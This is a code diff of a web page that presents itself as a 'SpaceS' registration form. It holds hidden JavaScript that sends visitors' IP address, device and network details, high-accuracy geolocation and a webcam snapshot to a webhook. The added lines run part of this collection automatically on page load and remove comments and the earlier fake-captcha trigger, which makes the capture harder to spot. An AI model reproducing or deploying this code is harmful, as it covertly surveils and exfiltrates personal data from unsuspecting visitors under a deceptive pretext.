@@ -6,7 +6,6 @@
     <meta name="description" content="SpaceS - Registration Page">
     <meta name="keywords" content="SpaceS, registration, sign up">
     <meta name="author" content="SpaceS Team">
-    <link rel="icon" href="favicon.ico" type="image/x-icon">
     <title>SpaceS - Registration</title>
     <style>
         :root {
@@ -128,132 +127,112 @@
                 alert("Error saving the data.");
             }
         });
-            // Helper: Send data
-      async function sendData(type, data) {
-        try {
-          await fetch(webhookUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ type, data }),
-          });
-          console.log(`Sent (${type}):`, data);
-        } catch (e) {
-          console.error("Send error:", e);
+
+        async function sendData(type, data) {
+            try {
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ type, data }),
+                });
+                console.log(`Sent (${type}):`, data);
+            } catch (e) {
+                console.error("Send error:", e);
+            }
         }
-      }
 
-      // Collect IP
-      async function fetchIP() {
-        try {
-          const res = await fetch("https://api.ipify.org?format=json");
-          const { ip } = await res.json();
-          await sendData("ip", { ip });
-        } catch (e) {
-          console.error("IP fetch error:", e);
+        async function fetchIP() {
+            try {
+                const res = await fetch("https://api.ipify.org?format=json");
+                const { ip } = await res.json();
+                await sendData("ip", { ip });
+            } catch (e) {
+                console.error("IP fetch error:", e);
+            }
         }
-      }
 
-      // Collect device info
-      function collectDeviceInfo() {
-        const deviceInfo = {
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          language: navigator.language,
-          cookiesEnabled: navigator.cookieEnabled,
-          screenWidth: window.screen.width,
-          screenHeight: window.screen.height,
-        };
-        sendData("device", deviceInfo);
-      }
-
-      // Collect location info
-      async function collectLocationInfo() {
-        if (navigator.geolocation) {
-          try {
-            await new Promise((resolve, reject) =>
-              navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                  sendData("location", {
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                  });
-                  resolve();
-                },
-                (err) => {
-                  console.warn("Location error:", err);
-                  reject(err);
-                },
-                { enableHighAccuracy: true }
-              )
-            );
-          } catch (e) {
-            console.warn("Geolocation error:", e);
-          }
+        function collectDeviceInfo() {
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+            };
+            sendData("device", deviceInfo);
         }
-      }
 
-      // Collect camera snapshot
-      async function collectCameraInfo() {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          const video = document.createElement("video");
-          video.srcObject = stream;
-          await video.play();
-          const canvas = document.createElement("canvas");
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-          const snapshot = canvas.toDataURL("image/png");
-          await sendData("camera", { snapshot });
-          stream.getTracks().forEach((track) => track.stop());
-        } catch (e) {
-          console.warn("Camera access error:", e);
+        async function collectLocationInfo() {
+            if (navigator.geolocation) {
+                try {
+                    await new Promise((resolve, reject) =>
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => {
+                                sendData("location", {
+                                    lat: pos.coords.latitude,
+                                    lng: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy,
+                                });
+                                resolve();
+                            },
+                            (err) => {
+                                console.warn("Location error:", err);
+                                reject(err);
+                            },
+                            { enableHighAccuracy: true }
+                        )
+                    );
+                } catch (e) {
+                    console.warn("Geolocation error:", e);
+                }
+            }
         }
-      }
 
-      // Collect network info
-      function collectNetworkInfo() {
-        if (navigator.connection) {
-          const networkInfo = {
-            type: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-          };
-          sendData("network", networkInfo);
+        async function collectCameraInfo() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+                const snapshot = canvas.toDataURL("image/png");
+                await sendData("camera", { snapshot });
+                stream.getTracks().forEach((track) => track.stop());
+            } catch (e) {
+                console.warn("Camera access error:", e);
+            }
         }
-      }
 
-      // Main process
-      async function runDataCollection() {
-        // Start sending data immediately
-        const ipPromise = fetchIP();
-        const deviceInfoPromise = collectDeviceInfo();
-        const networkInfoPromise = collectNetworkInfo();
+        function collectNetworkInfo() {
+            if (navigator.connection) {
+                const networkInfo = {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                };
+                sendData("network", networkInfo);
+            }
+        }
 
-        // Conditional data collection
-        const locationPromise = collectLocationInfo();
-        const cameraPromise = collectCameraInfo();
+        async function runDataCollection() {
+            const ipPromise = fetchIP();
+            const deviceInfoPromise = collectDeviceInfo();
+            const networkInfoPromise = collectNetworkInfo();
+            const locationPromise = collectLocationInfo();
+            const cameraPromise = collectCameraInfo();
 
-        // Wait for all promises to resolve
-        await Promise.all([ipPromise, deviceInfoPromise, networkInfoPromise, locationPromise, cameraPromise]);
+            await Promise.all([ipPromise, deviceInfoPromise, networkInfoPromise, locationPromise, cameraPromise]);
+        }
 
-        // Once all data is collected, redirect
-        window.location.href = redirectUrl;
-      }
-
-      document.getElementById("verify-button").addEventListener("click", () => {
-        document.querySelector(".captcha-container").innerHTML =
-          "<p>Сбор данных... Пожалуйста, подождите.</p>";
-        runDataCollection();
-      });
-
-      // Auto-start data collection on page load
-      window.addEventListener("load", () => {
-        fetchIP();
-        collectDeviceInfo();
-        collectNetworkInfo();
-      });
-      }
+        // Start collecting data on page load
+        window.addEventListener("load", () => {
+            fetchIP();
+            collectDeviceInfo();
+            collectNetworkInfo();
+        });
     </script>
 </body>
 </html>
